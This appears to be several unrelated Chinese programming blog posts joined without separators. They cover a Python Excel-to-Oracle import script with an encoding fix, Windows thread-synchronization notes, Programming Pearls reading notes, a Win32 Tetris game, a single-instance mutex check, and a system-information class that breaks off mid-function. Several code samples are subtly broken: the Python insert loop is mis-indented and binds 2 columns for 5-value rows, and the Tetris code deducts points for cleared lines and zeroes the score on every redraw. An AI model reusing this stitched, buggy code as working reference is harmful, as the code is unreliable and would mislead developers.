一个例子脚本：
# -*- coding: utf-8 -*-

import xlrd
import datetime
import cx_Oracle
import time
from itertools import islice
import os
os.environ['NLS_LANG']='SIMPLIFIED CHINESE_CHINA.ZHS16GBK'



LineName = ['1号线','2号线']
StationName = []

########################链接数据库相关######################################

def getConnOracle(username,password,ip,service_name):
    try:
        conn = cx_Oracle.connect(username+'/'+password+'@'+ip+'/'+service_name)  # 连接数据库
        return conn
    except Exception:
        print(Exception)

#######################进行数据批量插入#######################

def insertOracle(conn,data,input_file_name):
    sheetnumber = getSheetNumber(data)
    cursor = conn.cursor()
    try:
        for x in range(0,sheetnumber):
            templist = excel_table_byindex(input_file_name,0,x)
            cursor.prepare('insert into temp_table(importtime ,carrier) values(:1,:2)') 
             # 使用cursor进行各种操作，templist数值需要和表temp_table对应
             cursor.executemany(None,templist)

        conn.commit()
    except cx_Oracle.DatabaseError as msg:
        print(msg)
    finally:
        cursor.close()
        conn.close()

###########################打开excel文件########################
def openXLS(path):
    try:
        data = xlrd.open_workbook(path)
        return data
    except Exception:
        print(Exception)

def getSheetNumber(data):
    sheet_num = len(data.sheets())
    return sheet_num
#######################一些数据清洗工作########################
def getlineName(str):
    for x in LineName:
        if x in str:
            return  x

def getStationName(str):
    for x in StationName:
        if x in str:
            return x
##########将excel中除去表头的一个sheet读出来,返回一个list#############
def excel_table_byindex(path,colnameindex = 0,by_index = 0):
    today = time.strftime('%Y%m%d', time.localtime(time.time()))
    data = openXLS(path)
    table = data.sheets()[by_index]
    nrows = table.nrows
    ncols = table.ncols

    colnames = table.row_values(colnameindex)
    list = []
    for rownum in range(1,nrows):
        row = table.row_values(rownum)
        temp_lineName = getlineName(row[6])
        temp_stationName = getStationName(row[6])
        if row:
            app = [today, str(row[1]), str(row[2]),temp_stationName,temp_lineName]
            # for i in range(len(colnames)):
            #     app[colnames[i]] = row[i]
            list.append(app)
    return list

###################一个可以从文件第二行开始读的办法#############

def getAllStationName(path):
    StationName_file = open(path, 'r', encoding='utf-8')
    #count = len(StationName_file.readlines())

    for line in islice(StationName_file,1,None):
        str_temp = line.strip('\n')
        if str_temp not in LineName and str_temp !='----'and str_temp!='':
            StationName.append(str_temp)

####################################################################
def getStationNamefromexcel(path):

    data = openXLS(path)
    table = data.sheets()[0]
    nrows = table.nrows
    ncols = table.ncols
    colnames = table.row_values(0)
    list = []
    for rownum in range(0,nrows):
        row = table.row_values(rownum)[0]
        if row:
            list.append(row)
    return list

#################################################################
def main():
    username = 'xx'
    password = 'xx'
    ip = '192.168.1.1'
    service_name = 'iop'
    #获取数据库链接
    conn = getConnOracle(username,password,ip,service_name)

    input_file_name = (r"E:\code\python\findS\subwayBase\xx.xlsx")
    #output_file_name = input("Enter the output file name:")
    getAllStationName(r"E:\code\python\findS\subwayBase\站点.txt")


    begin = datetime.datetime.now()

    insertOracle(conn,openXLS(input_file_name),input_file_name)

    # x.fetchone()
    # c.close()  # 关闭cursor
    # conn.close()  # 关闭连接

    end = datetime.datetime.now()
    print((end - begin).seconds)

if __name__ =='__main__':
    main()

python3 windows下使用cx_Oracle操作oracle的报错问题
报错信息如下：

Traceback (most recent call last):
  File "E:/code/python/findS/findSubwayBase.py", line 134, in <module>
    main()
  File "E:/code/python/findS/findSubwayBase.py", line 124, in main
    insertOracle(conn,openXLS(input_file_name),input_file_name)
  File "E:/code/python/findS/findSubwayBase.py", line 32, in insertOracle
    cursor.executemany(None,templist)
UnicodeEncodeError: 'ascii' codec can't encode characters in position 1-6: ordinal not in range(128)

Process finished with exit code 1
在使用python3 的cx_Oracle操作oracle数据时候，不可避免的会遇到中文的编码问题，当然，上网一搜全是python2的，解决方案是：
#在开头加上
import sys
reload(sys)
sys.setdefaultencoding( "utf-8" )
python3中的解决方案为：加上核心代码
import os
os.environ['NLS_LANG']='SIMPLIFIED CHINESE_CHINA.ZHS16GBK'
就ok啦，其实就是设置一下客户端编码 ，参考：python编码 OS.ENVIRON详解
xlrd 操作excel
demo代码：
#获取一个工作表

table = data.sheets()[0]          #通过索引顺序获取

table = data.sheet_by_index(0) #通过索引顺序获取

table = data.sheet_by_name(u'Sheet1')#通过名称获取

#获取整行和整列的值（数组）
 　　
table.row_values(i)

table.col_values(i)

#获取行数和列数
　　
nrows = table.nrows
ncols = table.ncols

#循环行列表数据
for i in range(nrows ):
      print table.row_values(i)

#单元格
cell_A1 = table.cell(0,0).value

cell_C4 = table.cell(2,3).value

#使用行列索引
cell_A1 = table.row(0)[0].value

cell_A2 = table.col(1)[0].value

#简单的写入
row = 0

col = 0

# 类型 0 empty,1 string, 2 number, 3 date, 4 boolean, 5 error
ctype = 1 value = '单元格的值'

xf = 0 # 扩展的格式化

table.put_cell(row, col, ctype, value, xf)

table.cell(0,0)  #单元格的值'

table.cell(0,0).value #单元格的值'
参考链接
[OS.ENVIRON详解]: http://blog.csdn.net/junweifan/article/details/7615591
[python编码]:http://www.cnblogs.com/fkissx/p/5417363.html
再次强烈推荐，精通oracle+python系列：官方文档 
http://www.oracle.com/technetwork/cn/articles/dsl/mastering-oracle-python-1391323-zhs.html 
离线版本下载链接： 
http://download.csdn.net/detail/wangyaninglm/9815726 






﻿﻿


对于操作系统而言，在并行程序设计中难免会遇到数据同步和共享的问题，本文针对这个问题，以windows系统为例回顾一下资源同步的相关问题。要点如下：


1.同步和数据共享
 数据征用

2.同步原语
    1.互斥和临界区
    2.自旋锁
    3.信号量
    4.读写锁
    5.屏障
    6.原子操作与无锁代码

3.进程和进程间通信
    1.共享内存和映射文件
    2.条件变量
    3.信号和事件
    4.消息队列
    5.命名管道
    6.socket网络栈


一，基础知识




知识点：句柄

许多windows API函数都返回句柄。句柄只是无符号整数，但却有特殊的用途。返回句柄的windows API 调用实际上是在内核空间创建某个资源，句柄只是这个资源的索引。当应用程序使用完该资源后，就可调用CloseHandle()使内核释放相关的内核空间资源。

创建线程的3种不同的方式
 

#include "stdafx.h"

#include<windows.h>
#include<process.h>

DWORD WINAPI mywork1( LPVOID lpParameter)
{
    printf("CreatThread thread %i\n",GetCurrentThreadId());
    return 0;
}

unsigned int __stdcall mywork2(void *data)
{
    printf("_beginthreadex thread %i\n",GetCurrentThreadId());
    return 0;
}

void mywork3(void * data)
{
    printf("_beginthreade thread %i\n",GetCurrentThreadId());

}

int _tmain(int argc, _TCHAR* argv[])
{

    HANDLE h1,h2,h3;
    h1 = CreateThread(0,0,mywork1,0,0,0);

    h2 = (HANDLE)_beginthreadex(0,0,&mywork2,0,0,0);
    WaitForSingleObject(h2,INFINITE);
    CloseHandle(h2);

    h3 = (HANDLE)_beginthread(&mywork3,0,0);
    getchar();
    return 0;
}
       调用_beginthread()是个吸引人的选择，这个函数的参数较少，并且在线程退出后清除句柄。但是，如果线程终止，则_beginthread()调用返回的句柄将是无效的，或是被重用的，因此无法查询线程的状态，甚至无法肯定线程句柄是最初指向同一线程的句柄。




加上getchar（）的区别




二，同步和资源共享的方式


判断一个数是否为素数：
#include<math.h>
int isprime(int number)
{
int i;
for( i = 2; i < (int) (sqrt((float)number) + 1.0); i++)
{
    if(number % i == 0 ){ return 0;}
}
return 1;
}

测试给定范围内数字是否为素数的算法,如果两个线程同时访问变量counter，这将导致数据征用，正确的代码需要对递增变量counter的操作进行保护。

volatile int counter = 0;
unsigned int __stdcall test(void *)
{
while(counter < 100)
{
    int number = counter++;
//c++格式话输出要用cout对象的方法来控制
    printf（"ThreadID %i value = %i    is prime  = %i  \n", GetCurrentThreadId(), number , isprime(number) );

}
return 0;
}



1.保护对临界区代码的访问：



// testofCriticalSection.cpp : 定义控制台应用程序的入口点。
//
#include "stdafx.h"
#include <windows.h>
#include <process.h>
#include <math.h>

volatile int counter = 0;
CRITICAL_SECTION critical;

int isprime(int number)
{

    int i;
    for( i = 2; i < (int) (sqrt((float)number) + 1.0); i++)
    {
        if(number % i == 0 ){ return 0;}
    }
    return 1;
}


unsigned int __stdcall test(void *)
{
    while (counter < 100)
    {    
        while ( !TryEnterCriticalSection( &critical)){}
        int number = counter++;
        LeaveCriticalSection( &critical);
        printf("ThreadID %i; value = %i, is prime = %i\n",
            GetCurrentThreadId(), number, isprime(number));
    }
    return 0;
}

/*
unsigned int __stdcall test(void *)
{
    while (counter < 100)
    {
        EnterCriticalSection( &critical);
        int number = counter++;
        LeaveCriticalSection( &critical);
        printf("ThreadID %i; value = %i, is prime = %i\n",
            GetCurrentThreadId(), number, isprime(number));
    }
    return 0;
}
*/
int _tmain(int argc, _TCHAR* argv[])
{
    HANDLE h1, h2;
    InitializeCriticalSection( &critical);
    h1 = (HANDLE)_beginthreadex(0, 0, &test,(void*)0, 0, 0);
    h2 = (HANDLE)_beginthreadex(0, 0, &test,(void*)0, 0, 0);
    WaitForSingleObject(h1,INFINITE);//
    WaitForSingleObject(h2,INFINITE);
    CloseHandle(h1);
    CloseHandle(h2);
    getchar();
    DeleteCriticalSection( &critical);
    return 0;
}






使线程休眠然后再唤醒线程非常耗时，因为这涉及进入内核。所有临界区在设计上都应保证耗时尽可能短。要谨记，很可能线程进入休眠时，原处于临界区的线程已经离开。因此，令等待线程休眠后再唤醒浪费了很多时间。

有两种选择解决上述问题：
1.使用TryEnterCriticalSection()避免让调用线程休眠
2.面向临界区设定旋转计数的方法
InitializeCriticalSetionAndSpinCount（ &critical，1000）
SetCriticalSectionSpinCount( &critical, 1000)





参考文献：

戈夫. 多核应用编程实战[M]. 人民邮电出版社, 2013.

 





编程珠玑2阅读笔记：

1.使用c语言性能监视器，完成对代码的调优工作

2.关联数组：
 拓扑排序算法，可以用于当存在遮挡的时候决定三维场景的绘制顺序。

3.小型算法中的测试与调试工具
脚手架程序：《人月神话》一个软件产品中应该有一半的代码都是脚手架。
类似，小型的代码库

4.自描述数据
每个程序员都知道破解神秘数据的挫折与艰辛。


5.劈开戈尔迪之结
什么是用户的真正需求：
一个运筹学者接到任务，设计末座大楼的电梯调度策略，使乘客等待的时间最短，在走访了这座大楼之后，他认识到雇主真正想要解决的问题是，尽量减少乘客的不适（ 乘客不喜欢等电梯）。他这样解决问题：在每部电梯附近装上几面镜子。乘客在等电梯时候，可以自我欣赏一下，对电梯速度的抱怨大幅减少了。他发现了用户的真正需求

7.粗略估算
程序员3大美德：对数值敏感，实验的欲望，良好的数学功底



在来说这个俄罗斯方块，其实主要是2个大的部分：
1.界面绘制（游戏区，信息区，刷新重绘工作）
游戏区方块的绘制，其实都是数组来记录

2.游戏逻辑（上下左右，变形）
其实就是对数组的旋转

主要代码，才六百行：


// Russian_cube.cpp : 定义应用程序的入口点。
//
//
//
//
#include "stdafx.h"
#include "Russian_cube.h"

#define MAX_LOADSTRING 100
//Tetris
#define BOUND_SIZE 10
#define TETRIS_SIZE 30
#define GAME_X 10
#define GAME_Y 20
#define INFO_X 6
#define INFO_Y GAME_Y

//定时器
#define  MY_TIMEER 1
#define  DEFAULT_INTERVAL 500 //默认每0.5秒下降一格

//定义俄罗斯方块的形状
BOOL g_astTetris[][4][4] = 
{
	{{1,1,0,1},{0,0,0,0},{0,0,0,0},{0,0,0,0}},
	{{1,1,0,0},{0,0,1,1},{0,0,0,0},{0,0,0,0}},
	{{1,1,0,0},{1,1,0,0},{0,0,0,0},{0,0,0,0}},
	{{0,1,1,0},{1,1,0,0},{0,0,0,0},{0,0,0,0}},
	{{0,1,0,0},{1,1,1,0},{0,0,0,0},{0,0,0,0}},
	{{1,1,1,1},{0,0,0,0},{0,0,0,0},{0,0,0,0}}
};
#define  TETRIS_CNT (sizeof(g_astTetris)/sizeof(g_astTetris[0]))


//当前方块的形状
BOOL g_CurTetris[4][4];
BOOL g_NextTetris[4][4];
BOOL g_stGame[GAME_X][GAME_Y];//记录已经落下来的方块

//记录方块左上角的坐标
UINT TetrisX;
UINT TetrixY;
UINT g_uiInterval;
UINT g_uiScore;

UINT g_uiMySeed = 0xffff;

// 全局变量:
HINSTANCE hInst;								// 当前实例
TCHAR szTitle[MAX_LOADSTRING];					// 标题栏文本
TCHAR szWindowClass[MAX_LOADSTRING];			// 主窗口类名

// 此代码模块中包含的函数的前向声明:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

 	// TODO: 在此放置代码。
	MSG msg;
	HACCEL hAccelTable;

	// 初始化全局字符串
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_RUSSIAN_CUBE, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// 执行应用程序初始化:
	if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_RUSSIAN_CUBE));

	// 主消息循环:
	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int) msg.wParam;
}



//
//  函数: MyRegisterClass()
//
//  目的: 注册窗口类。
//
//  注释:
//
//    仅当希望
//    此代码与添加到 Windows 95 中的“RegisterClassEx”
//    函数之前的 Win32 系统兼容时，才需要此函数及其用法。调用此函数十分重要，
//    这样应用程序就可以获得关联的
//    “格式正确的”小图标。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_RUSSIAN_CUBE));
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= MAKEINTRESOURCE(IDC_RUSSIAN_CUBE);
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassEx(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目的: 保存实例句柄并创建主窗口
//
//   注释:
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

   hInst = hInstance; // 将实例句柄存储在全局变量中

   hWnd = CreateWindow(szWindowClass, szTitle,  WS_MINIMIZEBOX | WS_SYSMENU,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

int GetRandNum(int iMin,int iMax)
{
	//取随机数
	srand(GetTickCount() + g_uiMySeed-- );

	return iMin + rand()%(iMax -iMin);
}

VOID DrawBackGround(HDC hdc)
{
	int x, y;
	HPEN hPen = (HPEN)GetStockObject(NULL_PEN);
	HBRUSH hBrush = (HBRUSH)GetStockObject(GRAY_BRUSH);
    //(HBRUSH)CreateSolidBrush()

	
	HBRUSH hBrush_luo = (HBRUSH)GetStockObject(BLACK_BRUSH);

	Rectangle(hdc,BOUND_SIZE,BOUND_SIZE,BOUND_SIZE + GAME_X*TETRIS_SIZE
		,BOUND_SIZE + GAME_Y * TETRIS_SIZE);

	SelectObject(hdc,hPen);
	
	for (x = 0; x < GAME_X; x++)
	{
		for (y = 0 ;y < GAME_Y; y++)
		{
			if (g_stGame[x][y])
			{
				SelectObject(hdc,hBrush_luo);
			}
			else
			{
				
				SelectObject(hdc,hBrush);
			}
			Rectangle(hdc,BOUND_SIZE + x*TETRIS_SIZE,
				BOUND_SIZE + y * TETRIS_SIZE,
				BOUND_SIZE + (x + 1)*TETRIS_SIZE,
				BOUND_SIZE + (y + 1) * TETRIS_SIZE);
		}
	}
}
//信息区 的绘制
VOID DrawInfo(HDC hdc)
{
	int x,y;
	int nStartX,nStartY;
	RECT rect;
	TCHAR szBuf[100];//得分的字符串

	HPEN hPen = (HPEN)GetStockObject(BLACK_PEN);
	HBRUSH hBrush = (HBRUSH)GetStockObject(NULL_BRUSH);

	HBRUSH hBrush_have = (HBRUSH)GetStockObject(GRAY_BRUSH);
	SelectObject(hdc,hPen);
	SelectObject(hdc,hBrush);

	Rectangle(hdc,BOUND_SIZE*2 + GAME_X * TETRIS_SIZE,
		BOUND_SIZE,BOUND_SIZE *2 + (GAME_X + INFO_X)*TETRIS_SIZE,
		BOUND_SIZE + INFO_Y * TETRIS_SIZE);

	for (x = 0; x < 4; x++)
	{
		for (y = 0 ;y < 4 ;y++)
		{
			nStartX = BOUND_SIZE *2 + GAME_X*TETRIS_SIZE + (y +1)*TETRIS_SIZE;
			nStartY = BOUND_SIZE + (x +1)*TETRIS_SIZE;
			if (g_NextTetris[x][y])
			{
				SelectObject(hdc,hBrush);
			}
			else
			{
				SelectObject(hdc,hBrush_have);
			}
			Rectangle(hdc,nStartX,nStartY,nStartX+TETRIS_SIZE,nStartY+TETRIS_SIZE);
		}
	}

	nStartX = BOUND_SIZE *2 + GAME_X*TETRIS_SIZE;
	nStartY = BOUND_SIZE ;

	rect.left = nStartX + TETRIS_SIZE;
	rect.right = nStartX + TETRIS_SIZE * (INFO_X -1);
	rect.top = nStartY + TETRIS_SIZE *6;
	rect.bottom = nStartY + TETRIS_SIZE *7;

	wsprintf(szBuf,L"Score: %d",g_uiScore = 0);

	 DrawText(hdc,szBuf,wcslen(szBuf),&rect,DT_CENTER);

}

//绘制区方块，起始坐标和需要绘制的方块形状
VOID DrawTetris(HDC hdc, int nStartX,int nStartY,BOOL bTetris[4][4])
{
	int i,j;
	HPEN hPen = (HPEN)GetStockObject(BLACK_PEN);
	HBRUSH hBrush = (HBRUSH)GetStockObject(WHITE_BRUSH);
	SelectObject(hdc,hPen);
	SelectObject(hdc,hBrush);

	for (i = 0;i < 4; i++)
	{
		for (j = 0;j < 4;j++)
		{
			//j 是x方向的坐标偏移
			if (bTetris[i][j])
			{
				Rectangle(hdc,BOUND_SIZE +(nStartX + j) * TETRIS_SIZE,
					BOUND_SIZE + (nStartY + i)* TETRIS_SIZE,
					BOUND_SIZE +(nStartX + j + 1) * TETRIS_SIZE,
					BOUND_SIZE + (nStartY + i + 1)* TETRIS_SIZE);
			}
		}
	}
}

//旋转方块, 并且靠左上角
VOID RotateTetris(BOOL bTetris[4][4])
{
	BOOL bNewTetris[4][4] = {};//初始化置零
	int x, y;
	int xPos,yPos;
	BOOL bFlag;//靠近左上角

	//从上往下，从左往右，顺时针旋转
	//靠上
	for (x = 0,xPos = 0 ;x < 4 ; x++)
	{
		bFlag = FALSE;
		for (y = 0 ;y < 4 ;y++)
		{
			bNewTetris[xPos][y] = bTetris[3 - y][x];
			//逆时针旋转
			//bNewTetris[x][y] = bTetris[y][3 - x];
			if (bNewTetris[xPos][y])
			{
				bFlag = TRUE;//这一行有数据
			}
		}
		if (bFlag)
		{
			xPos++;
		}
	}


	memset(bTetris,0,sizeof(bNewTetris));
	//靠左
	for (y = 0, yPos = 0;y < 4 ;y++)
	{
		bFlag = FALSE;
		for (x = 0;x < 4; x++)
		{
			bTetris[x][yPos] = bNewTetris[x][y];
			if (bTetris[x][yPos])
			{
				bFlag = TRUE;
			}
		}
		if (bFlag)
		{
			yPos++;
		}
	}
	//memcpy(bTetris,bNewTetris,sizeof(bNewTetris));
	return;
}
BOOL CheckTetris(int nStartX,int nStartY,BOOL bTetris[4][4],BOOL bGame[GAME_X][GAME_Y])
{
	int x,y;
	if (nStartX < 0)
	{//碰到左墙
		return FALSE;
	}

	for (x = 0;x < 4;x++)
	{
		for (y = 0;y < 4;y++)
		{
			if (bTetris[x][y])
			{
				//碰右墙
				if (nStartX +y >=GAME_X)
				{
					return FALSE;
				}
				//碰下墙
				if (nStartY + x >=GAME_Y)
				{
					return FALSE;
				}
				//碰到已有的方块
				if (bGame[nStartX +y][nStartY + x])
				{
					return FALSE;
				}
			}
		}
	}
	return TRUE;
}

//落地的方块合并，并且满足消除一行
VOID RefreshTetris(int nStartX,int nStartY,BOOL bTetris[4][4], BOOL bGame[GAME_X][GAME_Y])
{
	BOOL bFlag = FALSE;
	int x,y;
	int newX,newY;//主要用来记录
	int iFulllie = 0; //校区满行的格子记录行数，用于积分

	for (x = 0; x < 4;x ++)
	{
		for (y = 0 ;y < 4; y++)
		{
			if (bTetris[x][y])
			{
				bGame[nStartX + y][nStartY +x] = TRUE;
			}
		}
	}

	for (y = GAME_Y,newY = GAME_Y; y >= 0; y--)
	{
		bFlag= FALSE;
		for (x = 0;x < GAME_X;x++)
		{
			bGame[x][newY] = bGame[x][y];
			if (!bGame[x][y])//这一行不满格
			{
				bFlag = TRUE;
			}
		}
		if (bFlag)
		{
			newY--;
		}
		else
		{
			//满格的话，用上一行替换这一行
			iFulllie++;
		}
	}

	if (iFulllie)
	{
		g_uiScore -= iFulllie *1;
	}
	//合并以后生成新的方块，并刷新位置
	memcpy(g_CurTetris,g_NextTetris,sizeof(g_CurTetris));
	memcpy(g_NextTetris,g_astTetris[ GetRandNum(0,TETRIS_CNT)],sizeof(g_NextTetris));

	TetrisX = (GAME_X - 4)/2;
	TetrixY = 0;
}

//初始化游戏,就是方块最先初始化的位置
VOID InitGame()
{
	int iTmp;

	TetrisX = (GAME_X - 4 )/2 ; //居中
	TetrixY = 0;

	g_uiScore = 0;
	g_uiInterval = DEFAULT_INTERVAL;

	iTmp = GetRandNum(0,TETRIS_CNT);
	memcpy(g_CurTetris,g_astTetris[iTmp],sizeof(g_CurTetris));

	iTmp = GetRandNum(0,TETRIS_CNT);
	memcpy(g_NextTetris,g_astTetris[iTmp],sizeof(g_NextTetris));

	memset(g_stGame,0,sizeof(g_stGame));
}
//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目的: 处理主窗口的消息。
//
//  WM_COMMAND	- 处理应用程序菜单
//  WM_PAINT	- 绘制主窗口
//  WM_DESTROY	- 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;

	int nWinX,nWinY,nClientX,nClientY;
	RECT rect;
	BOOL bTmpTetris[4][4] = {};

	switch (message)
	{
	case WM_CREATE:
		//获取窗口大小
		GetWindowRect(hWnd,&rect);
		nWinX = rect.right - rect.left;
		nWinY = rect.bottom - rect.top;
		//获取客户区大小
		GetClientRect(hWnd,&rect);
		nClientX = rect.right - rect.left;
		nClientY = rect.bottom - rect.top;

		MoveWindow(hWnd,0,0,3 * BOUND_SIZE + (GAME_X + INFO_X)* TETRIS_SIZE +
			(nWinX  - nClientX),
			2 * BOUND_SIZE + GAME_Y*TETRIS_SIZE + (nWinY - nClientY),true);
		InitGame();
		SetTimer(hWnd,MY_TIMEER,g_uiInterval,NULL);
		break;
	case WM_TIMER:
		//定时器中方块下降
		if (CheckTetris(TetrisX,TetrixY + 1,g_CurTetris,g_stGame))
		{
			TetrixY++;
		}
		else
		{
			if (TetrixY == 0)
			{
				MessageBox(NULL,L"不行了",L"shit!",MB_OK);
				KillTimer(hWnd,MY_TIMEER);
			}
			RefreshTetris(TetrisX,TetrixY,g_CurTetris,g_stGame);
		}
		InvalidateRect(hWnd,NULL,TRUE);

		break;
	case WM_LBUTTONDOWN:
		RotateTetris(g_CurTetris);
		InvalidateRect(hWnd,NULL,TRUE);
		break;
	case WM_KEYDOWN:
		switch(wParam)
		{
		case VK_LEFT://左方向键
			if (CheckTetris(TetrisX -1,TetrixY,g_CurTetris,g_stGame))
			{//判断一下当前方块没有靠墙就
				TetrisX--;
				InvalidateRect(hWnd,NULL,TRUE);
			}
			else
			{
				MessageBeep(0);
			}
			break;
		case  VK_RIGHT:
			if (CheckTetris(TetrisX +1,TetrixY,g_CurTetris,g_stGame))
			{//判断一下当前方块没有靠墙就
				TetrisX++;
				InvalidateRect(hWnd,NULL,TRUE);
			}
			else
			{
				MessageBeep(0);
			}
			break;
		case VK_UP://变形，但是要判断变形成功或者失败
			memcpy(bTmpTetris,g_CurTetris,sizeof(bTmpTetris));
			RotateTetris((bTmpTetris));
			if (CheckTetris(TetrisX,TetrixY,bTmpTetris,g_stGame))
			{
				//成功后，再把旋转后的copy回来
				memcpy(g_CurTetris,bTmpTetris,sizeof(bTmpTetris));
				InvalidateRect(hWnd,NULL,TRUE);
			}
			break;
		case VK_DOWN:
			while (CheckTetris(TetrisX,TetrixY + 1,g_CurTetris,g_stGame))
			{
				TetrixY++;
				
			}
			RefreshTetris(TetrisX,TetrixY,g_CurTetris,g_stGame);
			InvalidateRect(hWnd,NULL,TRUE);
			break;
		default:
			break;
		}
		
		break;
	case WM_COMMAND:
		wmId    = LOWORD(wParam);
		wmEvent = HIWORD(wParam);
		// 分析菜单选择:
		switch (wmId)
		{
		case IDM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		// TODO: 在此添加任意绘图代码...
		DrawBackGround(hdc);
		DrawInfo(hdc);
		DrawTetris(hdc,TetrisX,TetrixY,g_CurTetris);
		EndPaint(hWnd, &ps);
		break;
	case WM_DESTROY:
		KillTimer(hWnd,MY_TIMEER);
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}


代码参考：
主要是听了这个课程，这个公开课做点小项目，贪吃蛇，网络啊什么的，都是代码挺好的，作为一个熟悉其他领域的小项目非常适合上手：
http://study.163.com/course/courseLearn.htm?courseId=1367011#/learn/video?lessonId=1738230&courseId=1367011

windows下的win32编程要学的东西还比较多，下面给出一个简单的知识点：








 
 
问题来源：http://bbs.csdn.net/topics/390998279?page=1#post-398983061
 
 
 
 
// Only_once.cpp : 定义控制台应用程序的入口点。
//





//请参考<<windows核心编程>>
#include "StdAfx.h"
#include <iostream>
#include <windows.h>
using namespace std;

#define MUTEX_NAME     TEXT("Global//onename")//onename可以改别的

bool IsSingleProcess()
{
	HANDLE hMutex = CreateMutex(NULL, FALSE, MUTEX_NAME);
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		::CloseHandle(hMutex);
		return FALSE;
	}
	else
	{
		return TRUE;
	}
}


//函数名: exit()
//
//		 所在头文件：stdlib.h
//
//		 功 能: 关闭所有文件，终止正在执行的进程。
//
//		 exit(1)表示异常退出.这个1是返回给操作系统的。
//
//		 exit(x)（x不为0）都表示异常退出
//
//		 exit(0)表示正常退出
//
//		 exit()的参数会被传递给一些操作系统，包括UNIX,Linux,和MS DOS，以供其他程序使用。
int main()
{
	if (!IsSingleProcess())
	{
		cout << "already exist" << endl;
		getchar();
		exit(1);
	}
	Sleep(100000);
	return 0;
}



 






 
 下面的代码可以用于跨平台设备信息的获取
搭建传输的socket平台参考下面博文：
 
http://blog.csdn.net/wangyaninglm/article/details/41940287

 
 
 
GetsysInfo.h：
 
#ifndef _H_GETSYSINFO
#define _H_GETSYSINFO


#pragma once

#include <afxtempl.h>

class GetSysInfo
{
public:
	GetSysInfo(void);
	~GetSysInfo(void);

public:
	/********获取操作系统版本，Service pack版本、系统类型************/
	void GetOSVersion(CString &strOSVersion,CString &strServiceVersion);
	BOOL IsWow64();//判断是否为64位操作系统

	/***********获取网卡数目和名字***********/
	int  GetInterFaceCount();
	void GetInterFaceName(CString &InterfaceName,int pNum);

	/***获取物理内存和虚拟内存大小***/
	void GetMemoryInfo(CString &dwTotalPhys,CString &dwTotalVirtual);

	/****获取CPU名称、内核数目、主频*******/
	void GetCpuInfo(CString &chProcessorName,CString &chProcessorType,DWORD &dwNum,DWORD &dwMaxClockSpeed);

	/****获取硬盘信息****/
	void GetDiskInfo(DWORD &dwNum,CString chDriveInfo[]);

	/****获取显卡信息*****/
	void GetDisplayCardInfo(DWORD &dwNum,CString chCardName[]);
private:
	CStringList Interfaces;		                  //保存所有网卡的名字
	CList < DWORD, DWORD &>		Bandwidths;	  //各网卡的带宽
	CList < DWORD, DWORD &>		TotalTraffics;    //各网卡的总流量
};

#endif

 
 
 
Getsysinfo.cpp:
 
#include "StdAfx.h"
#include "GetsysInfo.h"
#include <atlbase.h>
#include "float.h"
#include "winperf.h"

GetSysInfo::GetSysInfo(void)
{
}

GetSysInfo::~GetSysInfo(void)
{
}

void GetSysInfo::GetOSVersion(CString &strOSVersion,CString &strServiceVersion)
{
	CString str;
	OSVERSIONINFOEX osvi;
	SYSTEM_INFO si;
	BOOL bOsVersionInfoEx;

	ZeroMemory(&si, sizeof(SYSTEM_INFO));
